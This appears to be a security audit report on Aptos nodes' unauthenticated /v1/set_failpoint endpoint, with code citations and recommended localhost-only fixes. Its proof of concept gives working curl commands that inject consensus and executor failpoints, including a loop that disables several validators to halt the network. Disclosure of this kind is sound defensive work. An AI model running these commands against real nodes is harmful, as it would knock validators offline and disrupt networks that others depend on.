# Audit Report

## Title
Remote Unauthenticated Failpoint Injection Enables Network-Wide Consensus Liveness Attack

## Summary
The `/v1/set_failpoint` API endpoint lacks IP-based access control, allowing remote attackers to weaponize failpoints against validators when the API is bound to `0.0.0.0` with `failpoints_enabled: true`. Attackers can trigger critical consensus failpoints to prevent validators from participating in AptosBFT consensus, causing network-wide liveness failure.

## Finding Description

The failpoint injection endpoint is designed for testing and debugging but lacks defensive IP-based access control. The vulnerability chain consists of:

**1. Missing IP Validation in Endpoint Handler**

The `set_failpoint_poem()` function accepts requests without checking the source IP address: [1](#0-0) 

The handler only validates `context.failpoints_enabled()` but does not extract or verify `remote_addr` to ensure requests originate from localhost.

**2. No IP-Based Middleware Protection**

The endpoint is registered without IP filtering middleware: [2](#0-1) 

The route applies standard middlewares (CORS, compression, logging) but no localhost-only restriction: [3](#0-2) 

**3. Configurable Public Binding**

The API configuration explicitly allows binding to `0.0.0.0` for all inbound connections: [4](#0-3) [5](#0-4) 

**4. Critical Consensus Failpoints**

The codebase contains numerous consensus-critical failpoints that, when triggered, prevent validator participation: [6](#0-5) [7](#0-6) [8](#0-7) 

These failpoints are used in testing to simulate validator failures: [9](#0-8) 

**Attack Execution Path:**

1. Attacker identifies validators with `failpoints_enabled: true` and `address: 0.0.0.0:8080` (testnet/devnet nodes, or misconfigured production nodes)
2. Attacker sends: `GET http://<validator-ip>:8080/v1/set_failpoint?name=consensus::send::any&actions=100%return`
3. The validator's `fail_point!("consensus::send::any")` triggers on all consensus message sends
4. Validator stops broadcasting proposals, votes, and sync messages
5. If >1/3 validators by stake are compromised, the network loses liveness
6. Even single validator attacks cause that validator to be excluded from consensus

**Broken Invariants:**
- **Consensus Safety**: AptosBFT liveness requires >2/3 validators to participate
- **Access Control**: Critical debugging interfaces should be localhost-only

## Impact Explanation

**Critical Severity - Total Loss of Liveness/Network Availability**

This vulnerability enables coordinated network-wide liveness attacks:

1. **Single Validator Impact**: Each compromised validator stops participating in consensus, reducing network capacity and potentially causing that validator to be slashed for missed proposals/votes

2. **Network-Wide Impact**: If attackers compromise ≥1/3 validators by stake, AptosBFT cannot form quorum certificates, causing complete network halt

3. **Non-Recoverable Partition**: Validators with different failpoint configurations may diverge in state, potentially requiring hardfork recovery

4. **Execution and State Failpoints**: Beyond consensus, attackers can trigger executor failpoints causing state corruption: [10](#0-9) [11](#0-10) 

The vulnerability qualifies for **Critical Severity ($1,000,000)** under "Total loss of liveness/network availability" and "Non-recoverable network partition."

## Likelihood Explanation

**Moderate-to-High Likelihood:**

**Attack Prerequisites:**
1. Validator must have `failpoints_enabled: true` (requires operator action)
2. API must be bound to `0.0.0.0` instead of `127.0.0.1` (operator misconfiguration)
3. Network must not be mainnet (config sanitizer blocks failpoints on mainnet): [12](#0-11) 

**Why This is Realistic:**

1. **Testnet/Devnet Exposure**: Test networks commonly enable debugging features and bind to `0.0.0.0` for accessibility
2. **Configuration Drift**: Operators may enable failpoints for debugging and forget to disable them or restrict binding
3. **Documentation Gap**: No explicit warnings that failpoints + public binding = remote attack vector
4. **Default Assumptions**: The code assumes operators understand security implications, but lacks defensive validation
5. **Discovery Ease**: Attackers can scan for exposed endpoints: `curl http://<ip>:8080/v1/set_failpoint?name=test&actions=return`

The sanitizer provides partial mitigation for mainnet but leaves testnet/devnet vulnerable, where real stake and ecosystem testing occurs.

## Recommendation

**Implement Multi-Layer Defense:**

**1. Add IP-Based Access Control (Primary Fix)**

Modify the handler to restrict failpoint access to localhost:

```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
    request: &poem::Request,
) -> poem::Result<String> {
    // Enforce localhost-only access
    let remote_addr = request.remote_addr().as_socket_addr();
    if let Some(addr) = remote_addr {
        if !addr.ip().is_loopback() {
            return Err(poem::Error::from(anyhow::anyhow!(
                "Failpoint endpoint is only accessible from localhost"
            )));
        }
    } else {
        return Err(poem::Error::from(anyhow::anyhow!(
            "Unable to determine remote address"
        )));
    }
    
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**2. Enhanced Configuration Validation**

Extend the sanitizer to enforce localhost binding when failpoints are enabled:

```rust
// In api_config.rs sanitize()
if api_config.failpoints_enabled {
    if !api_config.address.ip().is_loopback() {
        return Err(Error::ConfigSanitizerFailed(
            sanitizer_name,
            "Failpoints can only be enabled when API is bound to localhost (127.0.0.1)".into(),
        ));
    }
}
```

**3. Documentation and Warnings**

Add explicit warnings in configuration documentation about the security implications of enabling failpoints with non-localhost binding.

## Proof of Concept

**Setup (Testnet Configuration):**

```yaml
# node_config.yaml
api:
  enabled: true
  address: "0.0.0.0:8080"  # VULNERABLE: Public binding
  failpoints_enabled: true  # VULNERABLE: Failpoints enabled
```

**Attack Execution:**

```bash
# Step 1: Discover exposed endpoint
curl http://<validator-ip>:8080/v1/set_failpoint?name=test&actions=return

# Step 2: Inject consensus liveness failure
curl "http://<validator-ip>:8080/v1/set_failpoint?name=consensus::send::any&actions=100%return"

# Expected response: "Set failpoint consensus::send::any"

# Step 3: Verify validator stops sending consensus messages
# Monitor validator logs - should show no outgoing consensus messages

# Step 4: (Optional) Disable multiple validators to halt network
for ip in validator1 validator2 validator3; do
  curl "http://$ip:8080/v1/set_failpoint?name=consensus::send::any&actions=100%return"
done

# Step 5: Alternative - Inject execution failure
curl "http://<validator-ip>:8080/v1/set_failpoint?name=executor::commit_blocks&actions=return"
```

**Verification:**

After successful attack, validator logs will show:
- No outgoing `ProposalMsg`, `VoteMsg`, or `SyncInfo` broadcasts
- Increasing timeout counts
- Potential exclusion from active validator set
- Network-wide: Failed to form quorum certificates if ≥1/3 stake affected

**Recovery:**

```bash
# Disable failpoint (if still accessible)
curl "http://<validator-ip>:8080/v1/set_failpoint?name=consensus::send::any&actions=off"

# Or restart validator node
```

---

**Notes:**

This vulnerability demonstrates a critical gap in defensive programming: powerful debugging interfaces must enforce localhost-only access at the code level, not rely solely on operator configuration discipline. The mainnet sanitizer provides partial protection, but testnet/devnet validators—which process real transactions and ecosystem testing—remain vulnerable to coordinated liveness attacks.

### Citations

**File:** api/src/set_failpoints.rs (L23-40)
```rust
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/runtime.rs (L253-259)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** config/src/config/api_config.rs (L21-22)
```rust
    /// Address for the REST API to listen on. Set to 0.0.0.0:port to allow all inbound connections.
    pub address: SocketAddr,
```

**File:** config/src/config/api_config.rs (L95-96)
```rust
const DEFAULT_ADDRESS: &str = "127.0.0.1";
const DEFAULT_PORT: u16 = 8080;
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```

**File:** consensus/src/network.rs (L412-412)
```rust
        fail_point!("consensus::send::any", |_| ());
```

**File:** consensus/src/network.rs (L436-438)
```rust
        fail_point!("consensus::send::broadcast_proposal", |_| ());
        let msg = ConsensusMsg::ProposalMsg(Box::new(proposal_msg));
        self.broadcast(msg).await
```

**File:** consensus/src/network.rs (L478-481)
```rust
    pub async fn broadcast_vote(&self, vote_msg: VoteMsg) {
        fail_point!("consensus::send::vote", |_| ());
        let msg = ConsensusMsg::VoteMsg(Box::new(vote_msg));
        self.broadcast(msg).await
```

**File:** testsuite/smoke-test/src/aptos_cli/validator.rs (L120-123)
```rust
    rest_client_off
        .set_failpoint("consensus::send::any".to_string(), "100%return".to_string())
        .await
        .unwrap();
```

**File:** execution/executor/src/block_executor/mod.rs (L236-240)
```rust
                fail_point!("executor::block_executor_execute_block", |_| {
                    Err(ExecutorError::from(anyhow::anyhow!(
                        "Injected error in block_executor_execute_block"
                    )))
                });
```

**File:** execution/executor/src/block_executor/mod.rs (L383-385)
```rust
        fail_point!("executor::commit_blocks", |_| {
            Err(anyhow::anyhow!("Injected error in commit_blocks.").into())
        });
```
